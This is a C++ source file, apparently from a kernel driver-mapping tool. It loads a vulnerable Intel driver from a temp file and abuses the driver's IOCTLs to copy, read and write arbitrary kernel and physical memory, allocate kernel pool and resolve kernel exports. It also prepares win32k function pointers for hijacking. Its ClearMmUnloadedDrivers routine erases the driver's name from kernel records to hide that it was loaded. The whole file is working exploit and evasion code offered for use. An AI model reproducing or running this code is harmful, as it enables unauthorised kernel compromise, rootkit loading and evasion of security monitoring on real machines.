#include "intel_driver.hpp"

HANDLE intel_driver::Load()
{
	std::cout << "[<] Loading vulnerable driver" << std::endl;

	char temp_directory[MAX_PATH] = { 0 };
	const uint32_t get_temp_path_ret = GetTempPathA(sizeof(temp_directory), temp_directory);

	if (!get_temp_path_ret || get_temp_path_ret > MAX_PATH)
	{
		std::cout << "[-] Failed to get temp path" << std::endl;
		return nullptr;
	}

	const std::string driver_path = std::string(temp_directory) + "\\" + driver_name;
	std::remove(driver_path.c_str());

	if (!utils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(intel_driver_resource::driver), sizeof(intel_driver_resource::driver)))
	{
		std::cout << "[-] Failed to create vulnerable driver file" << std::endl;
		return nullptr;
	}

	if (!service::RegisterAndStart(driver_path))
	{
		std::cout << "[-] Failed to register and start service for the vulnerable driver" << std::endl;
		std::remove(driver_path.c_str());
		return nullptr;
	}

	return CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
}

void intel_driver::Unload(HANDLE device_handle)
{
	std::cout << "[<] Unloading vulnerable driver" << std::endl;

	ClearMmUnloadedDrivers(device_handle);
	CloseHandle(device_handle);

	service::StopAndRemove(driver_name);

	char temp_directory[MAX_PATH] = { 0 };

	const uint32_t get_temp_path_ret = GetTempPathA(sizeof(temp_directory), temp_directory);
	const std::string driver_path = std::string(temp_directory) + "\\" + driver_name;

	std::remove(driver_path.c_str());
}

bool intel_driver::MemCopy(HANDLE device_handle, uint64_t destination, uint64_t source, uint64_t size)
{
	if (!destination || !source || !size)
		return 0;

	COPY_MEMORY_BUFFER_INFO copy_memory_buffer = { 0 };

	copy_memory_buffer.case_number = 0x33;
	copy_memory_buffer.source = source;
	copy_memory_buffer.destination = destination;
	copy_memory_buffer.length = size;

	DWORD bytes_returned = 0;
	return DeviceIoControl(device_handle, ioctl1, &copy_memory_buffer, sizeof(copy_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
}

bool intel_driver::SetMemory(HANDLE device_handle, uint64_t address, uint32_t value, uint64_t size)
{
	if (!address || !size)
		return 0;

	FILL_MEMORY_BUFFER_INFO fill_memory_buffer = { 0 };

	fill_memory_buffer.case_number = 0x30;
	fill_memory_buffer.destination = address;
	fill_memory_buffer.value = value;
	fill_memory_buffer.length = size;

	DWORD bytes_returned = 0;
	return DeviceIoControl(device_handle, ioctl1, &fill_memory_buffer, sizeof(fill_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
}

bool intel_driver::GetPhysicalAddress(HANDLE device_handle, uint64_t address, uint64_t * out_physical_address)
{
	if (!address)
		return 0;

	GET_PHYS_ADDRESS_BUFFER_INFO get_phys_address_buffer = { 0 };

	get_phys_address_buffer.case_number = 0x25;
	get_phys_address_buffer.address_to_translate = address;

	DWORD bytes_returned = 0;

	if (!DeviceIoControl(device_handle, ioctl1, &get_phys_address_buffer, sizeof(get_phys_address_buffer), nullptr, 0, &bytes_returned, nullptr))
		return false;

	*out_physical_address = get_phys_address_buffer.return_physical_address;
	return true;
}

uint64_t intel_driver::MapIoSpace(HANDLE device_handle, uint64_t physical_address, uint32_t size)
{
	if (!physical_address || !size)
		return 0;

	MAP_IO_SPACE_BUFFER_INFO map_io_space_buffer = { 0 };

	map_io_space_buffer.case_number = 0x19;
	map_io_space_buffer.physical_address_to_map = physical_address;
	map_io_space_buffer.size = size;

	DWORD bytes_returned = 0;

	if (!DeviceIoControl(device_handle, ioctl1, &map_io_space_buffer, sizeof(map_io_space_buffer), nullptr, 0, &bytes_returned, nullptr))
		return 0;

	return map_io_space_buffer.return_virtual_address;
}

bool intel_driver::UnmapIoSpace(HANDLE device_handle, uint64_t address, uint32_t size)
{
	if (!address || !size)
		return false;

	UNMAP_IO_SPACE_BUFFER_INFO unmap_io_space_buffer = { 0 };

	unmap_io_space_buffer.case_number = 0x1A;
	unmap_io_space_buffer.virt_address = address;
	unmap_io_space_buffer.number_of_bytes = size;

	DWORD bytes_returned = 0;

	return DeviceIoControl(device_handle, ioctl1, &unmap_io_space_buffer, sizeof(unmap_io_space_buffer), nullptr, 0, &bytes_returned, nullptr);
}

bool intel_driver::ReadMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size)
{
	return MemCopy(device_handle, reinterpret_cast<uint64_t>(buffer), address, size);
}

bool intel_driver::WriteMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size)
{
	return MemCopy(device_handle, address, reinterpret_cast<uint64_t>(buffer), size);
}

bool intel_driver::WriteToReadOnlyMemory(HANDLE device_handle, uint64_t address, void* buffer, uint32_t size)
{
	if (!address || !buffer || !size)
		return false;

	uint64_t physical_address = 0;

	if (!GetPhysicalAddress(device_handle, address, &physical_address))
	{
		std::cout << "[-] Failed to translate virtual address 0x" << reinterpret_cast<void*>(address) << std::endl;
		return false;
	}

	const uint64_t mapped_physical_memory = MapIoSpace(device_handle, physical_address, size);

	if (!mapped_physical_memory)
	{
		std::cout << "[-] Failed to map IO space of 0x" << reinterpret_cast<void*>(physical_address) << std::endl;
		return false;
	}

	bool result = WriteMemory(device_handle, mapped_physical_memory, buffer, size);

	if (!UnmapIoSpace(device_handle, mapped_physical_memory, size))
		std::cout << "[!] Failed to unmap IO space of physical address 0x" << reinterpret_cast<void*>(physical_address) << std::endl;

	return result;
}

uint64_t intel_driver::AllocatePool(HANDLE device_handle, nt::POOL_TYPE pool_type, uint64_t size)
{
	if (!size)
		return 0;

	static uint64_t kernel_ExAllocatePool = 0;

	if (!kernel_ExAllocatePool)
		kernel_ExAllocatePool = GetKernelModuleExport(device_handle, utils::GetKernelModuleAddress("ntoskrnl.exe"), "ExAllocatePool");

	uint64_t allocated_pool = 0;

	if (!CallKernelFunction(device_handle, &allocated_pool, kernel_ExAllocatePool, pool_type, size))
		return 0;

	return allocated_pool;
}

bool intel_driver::FreePool(HANDLE device_handle, uint64_t address)
{
	if (!address)
		return 0;

	static uint64_t kernel_ExFreePool = 0;

	if (!kernel_ExFreePool)
		kernel_ExFreePool = GetKernelModuleExport(device_handle, utils::GetKernelModuleAddress("ntoskrnl.exe"), "ExFreePool");

	return CallKernelFunction<void>(device_handle, nullptr, kernel_ExFreePool, address);
}

uint64_t intel_driver::GetKernelModuleExport(HANDLE device_handle, uint64_t kernel_module_base, const std::string & function_name)
{
	if (!kernel_module_base)
		return 0;

	IMAGE_DOS_HEADER dos_header = { 0 };
	IMAGE_NT_HEADERS64 nt_headers = { 0 };

	if (!ReadMemory(device_handle, kernel_module_base, &dos_header, sizeof(dos_header)) || dos_header.e_magic != IMAGE_DOS_SIGNATURE ||
		!ReadMemory(device_handle, kernel_module_base + dos_header.e_lfanew, &nt_headers, sizeof(nt_headers)) || nt_headers.Signature != IMAGE_NT_SIGNATURE)
		return 0;

	const auto export_base = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	const auto export_base_size = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	if (!export_base || !export_base_size)
		return 0;

	const auto export_data = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(VirtualAlloc(nullptr, export_base_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

	if (!ReadMemory(device_handle, kernel_module_base + export_base, export_data, export_base_size))
	{
		VirtualFree(export_data, 0, MEM_RELEASE);
		return 0;
	}

	const auto delta = reinterpret_cast<uint64_t>(export_data) - export_base;

	const auto name_table = reinterpret_cast<uint32_t*>(export_data->AddressOfNames + delta);
	const auto ordinal_table = reinterpret_cast<uint16_t*>(export_data->AddressOfNameOrdinals + delta);
	const auto function_table = reinterpret_cast<uint32_t*>(export_data->AddressOfFunctions + delta);

	for (auto i = 0u; i < export_data->NumberOfNames; ++i)
	{
		const std::string current_function_name = std::string(reinterpret_cast<char*>(name_table[i] + delta));

		if (!_stricmp(current_function_name.c_str(), function_name.c_str()))
		{
			const auto function_ordinal = ordinal_table[i];
			const auto function_address = kernel_module_base + function_table[function_ordinal];

			if (function_address >= kernel_module_base + export_base && function_address <= kernel_module_base + export_base + export_base_size)
			{
				VirtualFree(export_data, 0, MEM_RELEASE);
				return 0; // No forwarded exports on 64bit?
			}

			VirtualFree(export_data, 0, MEM_RELEASE);
			return function_address;
		}
	}

	VirtualFree(export_data, 0, MEM_RELEASE);
	return 0;
}

bool intel_driver::GetNtGdiDdDDIReclaimAllocations2KernelInfo(HANDLE device_handle, uint64_t * out_kernel_function_ptr, uint64_t * out_kernel_original_function_address)
{
	// 488b05650e1400 mov     rax, qword ptr [rip+offset]
	// ff150f211600   call    cs:__guard_dispatch_icall_fptr

	static uint64_t kernel_function_ptr = 0;
	static uint64_t kernel_original_function_address = 0;

	if (!kernel_function_ptr || !kernel_original_function_address)
	{
		const uint64_t kernel_NtGdiDdDDIReclaimAllocations2 = GetKernelModuleExport(device_handle, utils::GetKernelModuleAddress("win32kbase.sys"), "NtGdiDdDDIReclaimAllocations2");

		if (!kernel_NtGdiDdDDIReclaimAllocations2)
		{
			std::cout << "[-] Failed to get export win32kbase.NtGdiDdDDIReclaimAllocations2" << std::endl;
			return false;
		}

		const uint64_t kernel_function_ptr_offset_address = kernel_NtGdiDdDDIReclaimAllocations2 + 0x7;
		int32_t function_ptr_offset = 0; // offset is a SIGNED integer

		if (!ReadMemory(device_handle, kernel_function_ptr_offset_address, &function_ptr_offset, sizeof(function_ptr_offset)))
			return false;

		kernel_function_ptr = kernel_NtGdiDdDDIReclaimAllocations2 + 0xB + function_ptr_offset;

		if (!ReadMemory(device_handle, kernel_function_ptr, &kernel_original_function_address, sizeof(kernel_original_function_address)))
			return false;
	}

	*out_kernel_function_ptr = kernel_function_ptr;
	*out_kernel_original_function_address = kernel_original_function_address;

	return true;
}

bool intel_driver::GetNtGdiGetCOPPCompatibleOPMInformationInfo(HANDLE device_handle, uint64_t * out_kernel_function_ptr, uint8_t * out_kernel_original_bytes)
{
	// 48ff2551d81f00   jmp	cs:__imp_NtGdiGetCOPPCompatibleOPMInformation
	// cccccccccc       padding

	static uint64_t kernel_function_ptr = 0;
	static uint8_t kernel_original_jmp_bytes[12] = { 0 };

	if (!kernel_function_ptr || kernel_original_jmp_bytes[0] == 0)
	{
		const uint64_t kernel_NtGdiGetCOPPCompatibleOPMInformation = GetKernelModuleExport(device_handle, utils::GetKernelModuleAddress("win32kfull.sys"), "NtGdiGetCOPPCompatibleOPMInformation");

		if (!kernel_NtGdiGetCOPPCompatibleOPMInformation)
		{
			std::cout << "[-] Failed to get export win32kfull.NtGdiGetCOPPCompatibleOPMInformation" << std::endl;
			return false;
		}

		kernel_function_ptr = kernel_NtGdiGetCOPPCompatibleOPMInformation;

		if (!ReadMemory(device_handle, kernel_function_ptr, kernel_original_jmp_bytes, sizeof(kernel_original_jmp_bytes)))
			return false;
	}

	*out_kernel_function_ptr = kernel_function_ptr;
	memcpy(out_kernel_original_bytes, kernel_original_jmp_bytes, sizeof(kernel_original_jmp_bytes));

	return true;
}

bool intel_driver::ClearMmUnloadedDrivers(HANDLE device_handle)
{
	ULONG buffer_size = 0;
	void* buffer = nullptr;

	NTSTATUS status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemExtendedHandleInformation), buffer, buffer_size, &buffer_size);

	while (status == nt::STATUS_INFO_LENGTH_MISMATCH)
	{
		VirtualFree(buffer, 0, MEM_RELEASE);

		buffer = VirtualAlloc(nullptr, buffer_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemExtendedHandleInformation), buffer, buffer_size, &buffer_size);
	}

	if (!NT_SUCCESS(status))
	{
		VirtualFree(buffer, 0, MEM_RELEASE);
		return false;
	}

	uint64_t object = 0;

	auto system_handle_inforamtion = static_cast<nt::PSYSTEM_HANDLE_INFORMATION_EX>(buffer);

	for (auto i = 0u; i < system_handle_inforamtion->HandleCount; ++i)
	{
		const nt::SYSTEM_HANDLE current_system_handle = system_handle_inforamtion->Handles[i];

		if (current_system_handle.UniqueProcessId != reinterpret_cast<HANDLE>(static_cast<uint64_t>(GetCurrentProcessId())))
			continue;

		if (current_system_handle.HandleValue == device_handle)
		{
			object = reinterpret_cast<uint64_t>(current_system_handle.Object);
			break;
		}
	}

	VirtualFree(buffer, 0, MEM_RELEASE);

	if (!object)
		return false;

	uint64_t device_object = 0;

	if (!ReadMemory(device_handle, object + 0x8, &device_object, sizeof(device_object)))
		return false;

	uint64_t driver_object = 0;

	if (!ReadMemory(device_handle, device_object + 0x8, &driver_object, sizeof(driver_object)))
		return false;

	uint64_t driver_section = 0;

	if (!ReadMemory(device_handle, driver_object + 0x28, &driver_section, sizeof(driver_section)))
		return false;

	UNICODE_STRING us_driver_base_dll_name = { 0 };

	if (!ReadMemory(device_handle, driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)))
		return false;

	us_driver_base_dll_name.Length = 0;

	if (!WriteMemory(device_handle, driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)))
		return false;

	return true;
}